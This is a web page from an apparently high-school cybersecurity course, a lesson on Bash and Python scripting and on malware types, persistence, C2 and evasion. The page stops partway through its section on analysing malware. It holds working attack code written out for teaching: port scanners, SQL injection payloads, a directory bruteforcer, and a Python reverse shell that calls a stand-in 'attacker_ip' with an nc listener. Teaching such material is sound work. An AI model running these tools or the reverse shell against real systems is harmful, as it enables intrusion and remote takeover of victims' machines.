<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lesson 5.1 - NCHS Cybersecurity</title>
    
    
    <link rel="icon" href="../../../img/logo.png">
    
    
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
    
    
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-DRPQMPQQS6"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'G-DRPQMPQQS6');
    </script>
    
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --bg-primary: #0a0e27;
            --bg-secondary: #141b3a;
            --text-primary: #00ff41;
            --text-secondary: #7affa7;
            --text-muted: #4a9960;
            --accent: #ff0844;
            --accent-secondary: #00d4ff;
            --border: #1a3a2a;
        }

        body {
            font-family: 'JetBrains Mono', monospace;
            background: var(--bg-primary);
            color: var(--text-secondary);
            line-height: 1.6;
            min-height: 100vh;
        }

        /* Navigation */
        nav {
            background: var(--bg-secondary);
            border-bottom: 2px solid var(--text-primary);
            padding: 0;
            position: sticky;
            top: 0;
            z-index: 1000;
            box-shadow: 0 4px 20px rgba(0, 255, 65, 0.2);
        }

        .nav-container {
            max-width: 1400px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 30px;
        }

        .nav-logo {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .nav-logo img {
            height: 40px;
            width: auto;
        }

        .nav-logo a {
            font-family: 'Orbitron', sans-serif;
            font-size: 1.5rem;
            font-weight: 900;
            color: var(--text-primary);
            text-decoration: none;
            letter-spacing: 0.1em;
            text-shadow: 0 0 10px var(--text-primary);
        }

        .nav-links {
            display: flex;
            gap: 30px;
            list-style: none;
            align-items: center;
        }

        .nav-links > li {
            position: relative;
        }

        .nav-links a {
            color: var(--text-secondary);
            text-decoration: none;
            font-weight: 600;
            transition: all 0.3s ease;
            padding: 8px 15px;
            border-radius: 4px;
            display: block;
        }

        .nav-links a:hover,
        .nav-links a.active {
            color: var(--text-primary);
            background: rgba(0, 255, 65, 0.1);
            text-shadow: 0 0 10px var(--text-primary);
        }

        /* Dropdown menu */
        .nav-links .dropdown {
            position: relative;
        }

        .nav-links .dropdown > a::after {
            content: ' ‚ñº';
            font-size: 0.7em;
            margin-left: 5px;
        }

        .nav-links .dropdown-content {
            display: none;
            position: absolute;
            top: 100%;
            left: 0;
            background: var(--bg-secondary);
            border: 2px solid var(--text-primary);
            border-radius: 4px;
            min-width: 250px;
            box-shadow: 0 8px 30px rgba(0, 255, 65, 0.3);
            z-index: 1000;
            padding: 10px 0;
            margin-top: 5px;
        }

        .nav-links .dropdown:hover .dropdown-content {
            display: block;
        }

        .nav-links .dropdown-content li {
            list-style: none;
        }

        .nav-links .dropdown-content a {
            padding: 10px 20px;
            border-radius: 0;
        }

        .nav-links .dropdown-content .nested {
            padding-left: 0;
        }

        .nav-links .dropdown-content .nested > strong {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 10px 20px;
            cursor: pointer;
            transition: all 0.3s ease;
            user-select: none;
        }

        .nav-links .dropdown-content .nested > strong:hover {
            background: rgba(0, 255, 65, 0.1);
        }

        .nav-links .dropdown-content .nested > strong::after {
            content: '‚ñº';
            font-size: 0.8em;
            transition: transform 0.3s ease;
            color: var(--text-primary);
        }

        .nav-links .dropdown-content .nested.collapsed > strong::after {
            transform: rotate(-90deg);
        }

        .nav-links .dropdown-content .nested .unit-lessons {
            max-height: 500px;
            overflow: hidden;
            transition: max-height 0.3s ease;
        }

        .nav-links .dropdown-content .nested.collapsed .unit-lessons {
            max-height: 0;
        }

        .nav-links .dropdown-content .nested .unit-lessons li {
            padding-left: 20px;
        }

        .nav-links .dropdown-content .nested a {
            padding: 8px 20px;
            font-size: 0.9em;
            color: var(--text-muted);
        }

        .nav-links .dropdown-content .nested a:hover {
            color: var(--text-primary);
            background: rgba(0, 255, 65, 0.05);
        }

        /* Mobile menu toggle */
        .nav-toggle {
            display: none;
            background: none;
            border: 2px solid var(--text-primary);
            color: var(--text-primary);
            padding: 8px 15px;
            cursor: pointer;
            border-radius: 4px;
        }

        /* Search */
        .search-container {
            position: relative;
            margin-left: 20px;
        }

        .search-input {
            padding: 8px 35px 8px 15px;
            background: var(--bg-primary);
            border: 2px solid var(--border);
            border-radius: 6px;
            color: var(--text-primary);
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.9rem;
            width: 250px;
            transition: all 0.3s ease;
        }

        .search-input:focus {
            outline: none;
            border-color: var(--text-primary);
            box-shadow: 0 0 15px rgba(0, 255, 65, 0.2);
        }

        .search-input::placeholder {
            color: var(--text-muted);
        }

        .search-icon {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--text-muted);
            pointer-events: none;
        }

        .search-results {
            position: absolute;
            top: calc(100% + 10px);
            left: 0;
            right: 0;
            background: var(--bg-secondary);
            border: 2px solid var(--text-primary);
            border-radius: 8px;
            max-height: 400px;
            overflow-y: auto;
            display: none;
            z-index: 2000;
            box-shadow: 0 8px 30px rgba(0, 255, 65, 0.3);
        }

        .search-results.active {
            display: block;
        }

        .search-result-item {
            padding: 15px;
            border-bottom: 1px solid var(--border);
            cursor: pointer;
            transition: all 0.2s ease;
        }

        .search-result-item:last-child {
            border-bottom: none;
        }

        .search-result-item:hover {
            background: rgba(0, 255, 65, 0.05);
        }

        .search-result-title {
            color: var(--text-primary);
            font-weight: 700;
            margin-bottom: 5px;
        }

        .search-result-path {
            color: var(--text-muted);
            font-size: 0.8rem;
            margin-bottom: 8px;
        }

        .search-result-excerpt {
            color: var(--text-secondary);
            font-size: 0.85rem;
            line-height: 1.4;
        }

        .search-highlight {
            background: var(--text-primary);
            color: var(--bg-primary);
            padding: 2px 4px;
            border-radius: 2px;
            font-weight: 700;
        }

        .search-no-results {
            padding: 20px;
            text-align: center;
            color: var(--text-muted);
        }

        .search-results::-webkit-scrollbar {
            width: 8px;
        }

        .search-results::-webkit-scrollbar-track {
            background: var(--bg-primary);
        }

        .search-results::-webkit-scrollbar-thumb {
            background: var(--text-primary);
            border-radius: 4px;
        }

        /* Main Content */
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 40px 30px;
        }

        /* Typography */
        h1, h2, h3, h4, h5, h6 {
            font-family: 'Orbitron', sans-serif;
            color: var(--text-primary);
            margin-top: 2rem;
            margin-bottom: 1rem;
            font-weight: 700;
        }

        h1 {
            font-size: 2.5rem;
            text-shadow: 0 0 20px var(--text-primary);
            letter-spacing: 0.05em;
            border-bottom: 2px solid var(--text-primary);
            padding-bottom: 15px;
        }

        h2 {
            font-size: 2rem;
            border-left: 4px solid var(--text-primary);
            padding-left: 15px;
        }

        h3 { font-size: 1.5rem; }
        h4 { font-size: 1.25rem; }

        p {
            margin-bottom: 1.2rem;
            color: var(--text-secondary);
        }

        a {
            color: var(--accent-secondary);
            text-decoration: none;
            transition: all 0.3s ease;
        }

        a:hover {
            color: var(--text-primary);
            text-shadow: 0 0 10px var(--text-primary);
        }

        /* Code Blocks */
        code {
            background: var(--bg-secondary);
            color: var(--text-primary);
            padding: 2px 8px;
            border-radius: 4px;
            border: 1px solid var(--border);
            font-family: 'JetBrains Mono', monospace;
        }

        pre {
            background: var(--bg-secondary);
            border: 2px solid var(--text-primary);
            border-radius: 8px;
            padding: 20px;
            overflow-x: auto;
            margin: 20px 0;
            box-shadow: 0 0 20px rgba(0, 255, 65, 0.2);
        }

        pre code {
            background: transparent;
            border: none;
            padding: 0;
        }

        /* Lists */
        ul, ol {
            margin-left: 30px;
            margin-bottom: 1.2rem;
        }

        li {
            margin-bottom: 0.5rem;
            color: var(--text-secondary);
        }

        li::marker {
            color: var(--text-primary);
        }

        /* Tables */
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
            background: var(--bg-secondary);
            border: 1px solid var(--border);
        }

        th {
            background: var(--bg-primary);
            color: var(--text-primary);
            padding: 12px;
            text-align: left;
            border: 1px solid var(--text-primary);
            font-weight: 700;
        }

        td {
            padding: 12px;
            border: 1px solid var(--border);
        }

        tr:hover {
            background: rgba(0, 255, 65, 0.05);
        }

        /* Blockquotes */
        blockquote {
            border-left: 4px solid var(--text-primary);
            background: var(--bg-secondary);
            padding: 15px 20px;
            margin: 20px 0;
            font-style: italic;
        }

        /* Images */
        img {
            max-width: 100%;
            height: auto;
            border-radius: 8px;
            margin: 20px 0;
        }

        /* Horizontal Rule */
        hr {
            border: none;
            border-top: 2px solid var(--text-primary);
            margin: 30px 0;
            opacity: 0.3;
        }

        /* Footer */
        footer {
            background: var(--bg-secondary);
            border-top: 2px solid var(--text-primary);
            padding: 30px;
            margin-top: 60px;
            text-align: center;
            color: var(--text-muted);
        }

        /* Scanline Effect */
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(
                to bottom,
                transparent 50%,
                rgba(0, 255, 65, 0.02) 51%
            );
            background-size: 100% 4px;
            pointer-events: none;
            z-index: 9999;
            animation: scan 8s linear infinite;
        }

        @keyframes scan {
            0% { transform: translateY(0); }
            100% { transform: translateY(100%); }
        }

        /* Selection */
        ::selection {
            background: var(--text-primary);
            color: var(--bg-primary);
        }

        /* Scrollbar */
        ::-webkit-scrollbar {
            width: 12px;
            background: var(--bg-primary);
        }

        ::-webkit-scrollbar-thumb {
            background: var(--text-primary);
            border-radius: 6px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: var(--text-secondary);
        }

        /* Responsive */
        @media (max-width: 768px) {
            .nav-toggle {
                display: block;
            }

            .nav-links {
                display: none;
                position: absolute;
                top: 100%;
                left: 0;
                right: 0;
                background: var(--bg-secondary);
                flex-direction: column;
                padding: 20px;
                border-bottom: 2px solid var(--text-primary);
            }

            .nav-links.active {
                display: flex;
            }

            h1 {
                font-size: 2rem;
            }

            .container {
                padding: 20px 15px;
            }

            .search-container {
                margin-left: 10px;
            }

            .search-input {
                width: 200px;
            }
        }

        /* Search Box */
        .search-box {
            padding: 10px;
            background: var(--bg-primary);
            border: 1px solid var(--text-primary);
            border-radius: 4px;
            color: var(--text-primary);
            font-family: 'JetBrains Mono', monospace;
        }

        .search-box::placeholder {
            color: var(--text-muted);
        }

        /* Lesson Navigation */
        .lesson-nav {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin: 60px 0 40px 0;
            padding: 30px;
            background: var(--bg-secondary);
            border-radius: 12px;
            border: 1px solid var(--border);
        }

        .lesson-nav-button {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 15px 30px;
            background: var(--bg-primary);
            border: 2px solid var(--text-primary);
            border-radius: 8px;
            color: var(--text-primary);
            text-decoration: none;
            font-weight: 600;
            transition: all 0.3s ease;
            font-family: 'JetBrains Mono', monospace;
        }

        .lesson-nav-button:hover {
            background: var(--text-primary);
            color: var(--bg-primary);
            transform: translateY(-3px);
            box-shadow: 0 10px 30px rgba(0, 255, 65, 0.3);
        }

        .lesson-nav-button.disabled {
            opacity: 0.3;
            pointer-events: none;
        }

        .lesson-nav-button .arrow {
            font-size: 1.2rem;
            font-weight: bold;
        }

        .lesson-nav-info {
            text-align: center;
            color: var(--text-secondary);
        }

        .lesson-nav-info .current-lesson {
            font-size: 0.9rem;
            color: var(--text-muted);
            margin-bottom: 5px;
        }

        .lesson-nav-info .lesson-title {
            font-size: 1.1rem;
            font-weight: 700;
            color: var(--text-primary);
        }

        @media (max-width: 768px) {
            .lesson-nav {
                flex-direction: column;
                gap: 20px;
            }

            .lesson-nav-button {
                width: 100%;
                justify-content: center;
            }

            .lesson-nav-info {
                order: -1;
            }
        }
    </style>
</head>
<body>
    <nav>
        <div class="nav-container">
            <div class="nav-logo">
                
                <img src="../../../img/logo.png" alt="Logo">
                
                <a href="https://mohamed-morsy33.github.io/cybersecuritynchs/">NCHS Cybersecurity</a>
            </div>
            
            <button class="nav-toggle" onclick="toggleMenu()">MENU</button>
            
            <ul class="nav-links" id="navLinks">
                
                <li >
                    
                        <a href="../../.." 
                           >
                            Home
                        </a>
                    
                </li>
                
                <li class="dropdown">
                    
                        <a href="#">Curriculum</a>
                        <ul class="dropdown-content">
                            
                                
                                    <li class="nested collapsed">
                                        <strong>Unit 1</strong>
                                        <ul class="unit-lessons">
                                            
                                            <li>
                                                <a href="../../unit1/lesson1-1/">Lesson 1.1</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../../unit1/lesson1-2/">Lesson 1.2</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../../unit1/lesson1-3/">Lesson 1.3</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../../unit1/lesson1-4/">Lesson 1.4</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../../unit1/lesson1-5/">Lesson 1.5</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../../unit1/lesson1-6/">Lesson 1.6</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../../unit1/installation-process/">Linux Installation Process</a>
                                            </li>
                                            
                                        </ul>
                                    </li>
                                
                            
                                
                                    <li class="nested collapsed">
                                        <strong>Unit 2</strong>
                                        <ul class="unit-lessons">
                                            
                                            <li>
                                                <a href="../../unit2/lesson2-1/">Lesson 2.1</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../../unit2/lesson2-2/">Lesson 2.2</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../../unit2/lesson2-3/">Lesson 2.3</a>
                                            </li>
                                            
                                        </ul>
                                    </li>
                                
                            
                                
                                    <li class="nested collapsed">
                                        <strong>Unit 3</strong>
                                        <ul class="unit-lessons">
                                            
                                            <li>
                                                <a href="../../unit3/lesson3-1/">Lesson 3.1</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../../unit3/lesson3-2/">Lesson 3.2</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../../unit3/lesson3-3/">Lesson 3.3</a>
                                            </li>
                                            
                                        </ul>
                                    </li>
                                
                            
                                
                                    <li class="nested collapsed">
                                        <strong>Unit 4</strong>
                                        <ul class="unit-lessons">
                                            
                                            <li>
                                                <a href="../../unit4/lesson4-1/">Lesson 4.1</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../../unit4/lesson4-2/">Lesson 4.2</a>
                                            </li>
                                            
                                        </ul>
                                    </li>
                                
                            
                                
                                    <li class="nested collapsed">
                                        <strong>Unit 5</strong>
                                        <ul class="unit-lessons">
                                            
                                            <li>
                                                <a href="./">Lesson 5.1</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../lesson5-2/">Lesson 5.2</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../lesson5-3/">Lesson 5.3</a>
                                            </li>
                                            
                                        </ul>
                                    </li>
                                
                            
                                
                                    <li class="nested collapsed">
                                        <strong>Unit 6</strong>
                                        <ul class="unit-lessons">
                                            
                                            <li>
                                                <a href="../../unit6/lesson6-1/">Lesson 6.1</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../../unit6/lesson6-2/">Lesson 6.2</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../../unit6/lesson6-3/">Lesson 6.3</a>
                                            </li>
                                            
                                        </ul>
                                    </li>
                                
                            
                                
                                    <li class="nested collapsed">
                                        <strong>Unit 7</strong>
                                        <ul class="unit-lessons">
                                            
                                            <li>
                                                <a href="../../unit7/lesson7-1/">Lesson 7.1</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../../unit7/lesson7-2/">Lesson 7.2</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../../unit7/lesson7-3/">Lesson 7.3</a>
                                            </li>
                                            
                                        </ul>
                                    </li>
                                
                            
                                
                                    <li class="nested collapsed">
                                        <strong>Unit 8</strong>
                                        <ul class="unit-lessons">
                                            
                                            <li>
                                                <a href="../../unit8/lesson8-1/">Lesson 8.1</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../../unit8/lesson8-2/">Lesson 8.2</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../../unit8/lesson8-3/">Lesson 8.3</a>
                                            </li>
                                            
                                        </ul>
                                    </li>
                                
                            
                                
                                    <li class="nested collapsed">
                                        <strong>Unit 9</strong>
                                        <ul class="unit-lessons">
                                            
                                            <li>
                                                <a href="../../unit9/lesson9-1/">Lesson 9.1</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../../unit9/lesson9-2/">Lesson 9.2</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../../unit9/lesson9-3/">Lesson 9.3</a>
                                            </li>
                                            
                                        </ul>
                                    </li>
                                
                            
                                
                                    <li class="nested collapsed">
                                        <strong>Unit 10</strong>
                                        <ul class="unit-lessons">
                                            
                                            <li>
                                                <a href="../../unit10/lesson10-1/">Lesson 10.1</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../../unit10/lesson10-2/">Lesson 10.2</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../../unit10/lesson10-3/">Lesson 10.3</a>
                                            </li>
                                            
                                        </ul>
                                    </li>
                                
                            
                                
                                    <li class="nested collapsed">
                                        <strong>Unit 11</strong>
                                        <ul class="unit-lessons">
                                            
                                            <li>
                                                <a href="../../unit11/lesson11-1/">Lesson 11.1</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../../unit11/lesson11-2/">Lesson 11.2</a>
                                            </li>
                                            
                                            <li>
                                                <a href="../../unit11/lesson11-3/">Lesson 11.3</a>
                                            </li>
                                            
                                        </ul>
                                    </li>
                                
                            
                        </ul>
                    
                </li>
                
                <li >
                    
                        <a href="../../../test/" 
                           >
                            Terminal
                        </a>
                    
                </li>
                
            </ul>

            <div class="search-container">
                <input type="text" 
                       class="search-input" 
                       id="searchInput" 
                       placeholder="Search lessons..."
                       autocomplete="off">
                <span class="search-icon">üîç</span>
                <div class="search-results" id="searchResults"></div>
            </div>
        </div>
    </nav>

    <div class="container">
        
        <h1 id="basic-scripting-malware">Basic Scripting &amp; Malware</h1>
<p>Now we're getting to the offensive side of cybersecurity. To understand how to defend against attacks, you need to understand how attacks work. And many attacks‚Äîespecially sophisticated ones‚Äîrely on scripting and programming.</p>
<h2 id="why-scripting-matters-in-cybersecurity">Why Scripting Matters in Cybersecurity</h2>
<p>Manual hacking is slow and inefficient. Professional security researchers and attackers alike use <strong>scripts</strong> to automate repetitive tasks, process large amounts of data, and perform complex operations quickly.</p>
<p>Scripting is essential for:
- <strong>Reconnaissance</strong>: Scanning networks and gathering information
- <strong>Exploitation</strong>: Automating exploit delivery
- <strong>Post-exploitation</strong>: Maintaining access and exfiltrating data
- <strong>Malware development</strong>: Creating viruses, worms, and trojans
- <strong>Defense</strong>: Analyzing logs, monitoring systems, automating responses
- <strong>Penetration testing</strong>: Simulating attacks to find vulnerabilities</p>
<p>If you want to be effective in cybersecurity‚Äîon either the offensive or defensive side‚Äîyou need to learn to script.</p>
<h2 id="bash-scripting-the-system-administrators-tool">Bash Scripting: The System Administrator's Tool</h2>
<p><strong>Bash (Bourne Again Shell)</strong> is the default shell on most Linux systems. A Bash script is a text file containing a series of commands that execute sequentially.</p>
<h3 id="your-first-bash-script">Your First Bash Script</h3>
<p>Let's create a simple network reconnaissance script:</p>
<pre><code class="language-bash">#!/bin/bash
# This is a comment - the line above tells the system this is a bash script

echo &quot;Starting network scan...&quot;

# Get your local IP address
MY_IP=$(hostname -I | awk '{print $1}')
echo &quot;Your IP address: $MY_IP&quot;

# Ping sweep to find active hosts
echo &quot;Scanning for active hosts...&quot;
for i in {1..254}; do
    ping -c 1 -W 1 192.168.1.$i &amp;&gt;/dev/null &amp;&amp; echo &quot;Host 192.168.1.$i is up&quot;
done

echo &quot;Scan complete!&quot;
</code></pre>
<p><strong>What this does:</strong>
- <code>#!/bin/bash</code> - shebang, tells system how to execute this file
- <code>echo</code> - prints text to terminal
- <code>$(command)</code> - command substitution, captures command output
- <code>for</code> loop - repeats actions
- <code>ping -c 1</code> - sends one ping packet
- <code>&amp;&gt;/dev/null</code> - discards output (silent operation)
- <code>&amp;&amp;</code> - only execute next command if previous succeeded</p>
<h3 id="bash-scripting-fundamentals">Bash Scripting Fundamentals</h3>
<p><strong>Variables:</strong></p>
<pre><code class="language-bash">NAME=&quot;scanner&quot;
COUNT=10
echo &quot;Running $NAME $COUNT times&quot;
</code></pre>
<p><strong>Conditionals:</strong></p>
<pre><code class="language-bash">if [ &quot;$COUNT&quot; -gt 5 ]; then
    echo &quot;Count is greater than 5&quot;
elif [ &quot;$COUNT&quot; -eq 5 ]; then
    echo &quot;Count equals 5&quot;
else
    echo &quot;Count is less than 5&quot;
fi
</code></pre>
<p><strong>Loops:</strong></p>
<pre><code class="language-bash"># For loop
for i in {1..10}; do
    echo &quot;Number $i&quot;
done

# While loop
COUNTER=0
while [ $COUNTER -lt 10 ]; do
    echo &quot;Counter: $COUNTER&quot;
    COUNTER=$((COUNTER + 1))
done
</code></pre>
<p><strong>Reading Files:</strong></p>
<pre><code class="language-bash">while IFS= read -r line; do
    echo &quot;Processing: $line&quot;
done &lt; targets.txt
</code></pre>
<p><strong>Functions:</strong></p>
<pre><code class="language-bash">scan_port() {
    local host=$1
    local port=$2
    timeout 1 bash -c &quot;echo &gt;/dev/tcp/$host/$port&quot; 2&gt;/dev/null &amp;&amp; \
        echo &quot;Port $port is open on $host&quot;
}

scan_port 192.168.1.1 80
scan_port 192.168.1.1 443
</code></pre>
<h3 id="practical-security-scripts">Practical Security Scripts</h3>
<p><strong>Port Scanner:</strong></p>
<pre><code class="language-bash">#!/bin/bash
TARGET=$1
for PORT in {1..1024}; do
    timeout 1 bash -c &quot;echo &gt;/dev/tcp/$TARGET/$PORT&quot; 2&gt;/dev/null &amp;&amp; \
        echo &quot;Port $PORT is open&quot;
done
</code></pre>
<p><strong>Log Monitor:</strong></p>
<pre><code class="language-bash">#!/bin/bash
LOG_FILE=&quot;/var/log/auth.log&quot;
ALERT_EMAIL=&quot;admin@company.com&quot;

# Watch for failed login attempts
tail -F $LOG_FILE | while read line; do
    if echo &quot;$line&quot; | grep -q &quot;Failed password&quot;; then
        echo &quot;ALERT: Failed login attempt detected: $line&quot; | \
            mail -s &quot;Security Alert&quot; $ALERT_EMAIL
    fi
done
</code></pre>
<h2 id="python-the-security-researchers-language">Python: The Security Researcher's Language</h2>
<p><strong>Python</strong> is the most popular language in cybersecurity. It's powerful, readable, and has thousands of libraries for security tasks.</p>
<h3 id="why-python">Why Python?</h3>
<ul>
<li><strong>Easy to learn</strong>: Clear, readable syntax</li>
<li><strong>Powerful libraries</strong>: Scapy for packets, Requests for web, Paramiko for SSH</li>
<li><strong>Cross-platform</strong>: Works on Linux, Windows, macOS</li>
<li><strong>Industry standard</strong>: Most security tools written in or support Python</li>
<li><strong>Rapid development</strong>: Write exploits and tools quickly</li>
</ul>
<h3 id="python-basics-for-security">Python Basics for Security</h3>
<p><strong>Simple Port Scanner:</strong></p>
<pre><code class="language-python">import socket

def scan_port(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    result = sock.connect_ex((host, port))
    sock.close()
    return result == 0  # 0 means port is open

target = &quot;192.168.1.1&quot;
for port in range(1, 1025):
    if scan_port(target, port):
        print(f&quot;Port {port} is open&quot;)
</code></pre>
<p><strong>HTTP Request Script:</strong></p>
<pre><code class="language-python">import requests

url = &quot;http://example.com/login&quot;
data = {&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;test&quot;}

response = requests.post(url, data=data)
print(f&quot;Status Code: {response.status_code}&quot;)
print(f&quot;Response: {response.text}&quot;)
</code></pre>
<p><strong>Password Generator:</strong></p>
<pre><code class="language-python">import random
import string

def generate_password(length=12):
    characters = string.ascii_letters + string.digits + string.punctuation
    password = ''.join(random.choice(characters) for _ in range(length))
    return password

# Generate 10 passwords
for _ in range(10):
    print(generate_password(16))
</code></pre>
<p><strong>Basic Network Sniffer (using Scapy):</strong></p>
<pre><code class="language-python">from scapy.all import sniff, IP, TCP

def packet_callback(packet):
    if packet.haslayer(IP):
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst

        if packet.haslayer(TCP):
            src_port = packet[TCP].sport
            dst_port = packet[TCP].dport
            print(f&quot;{src_ip}:{src_port} -&gt; {dst_ip}:{dst_port}&quot;)

# Sniff 100 packets
sniff(prn=packet_callback, count=100)
</code></pre>
<h3 id="python-for-web-exploitation">Python for Web Exploitation</h3>
<p><strong>SQL Injection Tester:</strong></p>
<pre><code class="language-python">import requests

def test_sql_injection(url, param):
    payloads = [
        &quot;' OR '1'='1&quot;,
        &quot;' OR '1'='1' --&quot;,
        &quot;' OR 1=1--&quot;,
        &quot;admin'--&quot;,
        &quot;' UNION SELECT NULL--&quot;
    ]

    for payload in payloads:
        params = {param: payload}
        response = requests.get(url, params=params)

        if &quot;error&quot; in response.text.lower() or \
           &quot;syntax&quot; in response.text.lower():
            print(f&quot;Possible SQL injection with payload: {payload}&quot;)

test_sql_injection(&quot;http://vulnerable-site.com/search&quot;, &quot;q&quot;)
</code></pre>
<p><strong>Directory Bruteforcer:</strong></p>
<pre><code class="language-python">import requests

def bruteforce_directories(base_url, wordlist_file):
    with open(wordlist_file, 'r') as f:
        for line in f:
            directory = line.strip()
            url = f&quot;{base_url}/{directory}&quot;

            response = requests.get(url)
            if response.status_code == 200:
                print(f&quot;Found: {url}&quot;)
            elif response.status_code == 403:
                print(f&quot;Forbidden: {url}&quot;)

bruteforce_directories(&quot;http://target.com&quot;, &quot;directories.txt&quot;)
</code></pre>
<h2 id="understanding-malware">Understanding Malware</h2>
<p>Now let's talk about the dark side: <strong>malware</strong> (malicious software). Understanding how malware works is crucial for defending against it.</p>
<h3 id="types-of-malware">Types of Malware</h3>
<p><strong>Viruses:</strong>
- Attach themselves to legitimate programs
- Spread when infected program is executed
- Require user action to spread
- Can modify or delete files, corrupt systems</p>
<p><strong>Worms:</strong>
- Self-replicating, spread automatically
- Don't need to attach to programs
- Spread through network vulnerabilities
- Can consume bandwidth and system resources
- Examples: Morris Worm (1988), WannaCry (2017)</p>
<p><strong>Trojans:</strong>
- Disguised as legitimate software
- Don't self-replicate
- Give attackers remote access
- Often used to install other malware
- Example: Banking trojans that steal credentials</p>
<p><strong>Ransomware:</strong>
- Encrypts victim's files
- Demands payment for decryption key
- Often spread through phishing or vulnerabilities
- Major threat to businesses and individuals
- Examples: WannaCry, Ryuk, REvil</p>
<p><strong>Spyware:</strong>
- Monitors user activity
- Steals information (passwords, credit cards, browsing)
- Often installed through deceptive downloads
- Keyloggers are a type of spyware</p>
<p><strong>Rootkits:</strong>
- Hide presence of other malware
- Operate at kernel level
- Very difficult to detect and remove
- Give attackers privileged access</p>
<p><strong>Botnets:</strong>
- Networks of infected computers (bots/zombies)
- Controlled by attacker (botmaster)
- Used for DDoS attacks, spam, crypto mining
- Victims often don't know they're infected</p>
<h3 id="malware-behavior">Malware Behavior</h3>
<p><strong>Persistence Mechanisms:</strong>
Malware needs to survive reboots and remain active.</p>
<p>Common techniques:
- Registry modifications (Windows)
- Startup scripts (Linux/Windows)
- Scheduled tasks
- Service installation
- Browser extensions
- Bootkit (infects boot process)</p>
<p><strong>Command and Control (C2):</strong>
Malware often communicates with attacker-controlled servers:
- Receive commands
- Exfiltrate stolen data
- Download updates
- Report infection status</p>
<p>C2 channels can use:
- HTTP/HTTPS (blend with normal traffic)
- DNS (queries can encode data)
- Social media APIs
- Peer-to-peer networks
- Custom protocols</p>
<p><strong>Evasion Techniques:</strong>
Malware tries to avoid detection:
- <strong>Obfuscation</strong>: Makes code hard to analyze
- <strong>Encryption</strong>: Encrypts itself, decrypts at runtime
- <strong>Polymorphism</strong>: Changes its code each time it spreads
- <strong>Metamorphism</strong>: Completely rewrites its code
- <strong>Anti-VM</strong>: Detects virtual machines used for analysis
- <strong>Time delays</strong>: Waits before activating to avoid sandboxes
- <strong>Domain generation algorithms (DGA)</strong>: Creates many C2 domains</p>
<h3 id="simple-malware-example-educational-purpose">Simple Malware Example (Educational Purpose)</h3>
<p><strong>IMPORTANT</strong>: This is for educational purposes only. Creating or deploying malware maliciously is illegal and unethical.</p>
<pre><code class="language-python"># Simple reverse shell (attacker gains remote access)
import socket
import subprocess

def reverse_shell(attacker_ip, attacker_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((attacker_ip, attacker_port))

    while True:
        # Receive command from attacker
        command = sock.recv(1024).decode()

        if command.lower() == 'exit':
            break

        # Execute command
        output = subprocess.run(command, shell=True, 
                              capture_output=True, text=True)

        # Send output back to attacker
        result = output.stdout + output.stderr
        sock.send(result.encode())

    sock.close()

# This would connect to attacker's machine
# reverse_shell(&quot;attacker_ip&quot;, 4444)
</code></pre>
<p>On the attacker side:</p>
<pre><code class="language-bash"># Listen for connection
nc -lvp 4444
</code></pre>
<p>This demonstrates how malware can give remote access, but real malware is much more sophisticated‚Äîwith encryption, obfuscation, persistence, and anti-detection.</p>
<h3 id="analyzing-malware-safely">Analyzing Malware Safely</h3>
<p><strong>Never run unknown malware on your actual system.</strong> Use:</p>
<p><strong>Virtual Machines:</strong>
- Isolated environment
- Can snapshot and revert
- Tools: VirtualBox, VMware, QEMU</p>
<p><strong>Sandboxes:</strong>
- Automated malware analysis
- Monitor behavior safely
- Tools: Cuckoo Sandbox, Joe Sandbox, Any.run</p>
<p><strong>Static Analysis:</strong>
- Examine code without executing
- Tools: IDA Pro, Ghidra, radare2
- Look for strings, imported functions, suspicious code</p>
<p><strong>Dynamic Analysis:</strong>
- Execute in controlled environment
- Monitor: file operations, network connections, registry changes
